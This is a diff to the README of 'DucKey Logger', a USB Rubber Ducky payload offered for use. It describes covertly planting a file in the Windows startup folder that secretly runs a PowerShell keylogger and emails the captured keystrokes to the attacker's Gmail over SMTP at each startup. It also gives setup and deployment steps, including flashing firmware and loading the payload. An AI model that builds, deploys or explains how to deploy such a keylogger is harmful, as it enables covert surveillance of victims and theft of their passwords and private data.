@@ -1,24 +1,27 @@
-# DuckLogger
+# DucKey Logger
 > Chris Taylor [Blue Cosmo] | 08/24/21
 ---
 
 ```
-:::::::::  :::    :::  ::::::::  :::    ::: :::        ::::::::   ::::::::   ::::::::  :::::::::: :::::::::
-:+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:       :+:    :+: :+:    :+: :+:    :+: :+:        :+:    :+:
-+:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+       +:+    +:+ +:+        +:+        +:+        +:+    +:+  
-+#+    +:+ +#+    +:+ +#+        +#++:++    +#+       +#+    +:+ :#:        :#:        +#++:++#   +#++:++#:    
-+#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+       +#+    +#+ +#+   +#+# +#+   +#+# +#+        +#+    +#+    
-#+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#       #+#    #+# #+#    #+# #+#    #+# #+#        #+#    #+#     
-#########   ########   ########  ###    ### ########## ########   ########   ########  ########## ###    ###     
+:::::::::  :::    :::  ::::::::  :::    ::: :::::::::: :::   :::
+:+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:        :+:   :+:
++:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+         +:+ +:+  
++#+    +:+ +#+    +:+ +#+        +#++:++    +#++:++#     +#++:   
++#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+           +#+    
+#+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#           #+#    
+#########   ########   ########  ###    ### ##########    ###     
 ```
 
 ## Overview:
 ```
-DuckLogger is a USB RubberDucky payload that uses powershell to log keystrokes
+DucKey Logger is a USB RubberDucky payload that uses PowerShell to log keystrokes
 ```
+- Du - USB Rubber*Du*cky
+- Croc - Key*Croc*
+---
 - moves *c.cmd* file to windows startup directory
-- *c.cmd* will secretly run *l.ps1*
-- *l.ps1* will log keystrokes and email the logs every startup [via SMTP]
+- *c.cmd* will secretly run *p.ps1*
+- *p.ps1* will log keystrokes and email the logs every startup [via SMTP]
 
 ## Resources:
 - [YouTube Video]()
@@ -26,7 +29,7 @@ DuckLogger is a USB RubberDucky payload that uses powershell to log keystrokes
 - [Website](https://cosmodiumcs.com)
 
 ## Requirements:
-- Twin-Duck flashware
+- Twin-Duck firmware
 - Gmail account
     - i suggest making a separate Gmail account for this payload
     - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
@@ -57,7 +60,7 @@ REM STAGE 4 [OPTION2]
 REM restart computer
 STRING shutdown /r
 ```
-4. flash Twin-Duck flashware on to your duck
+4. flash Twin-Duck firmware on to your duck
     - [Tutorial](https://youtu.be/ao32BS8fwaM?t=700)
 5. load and deploy!!
 
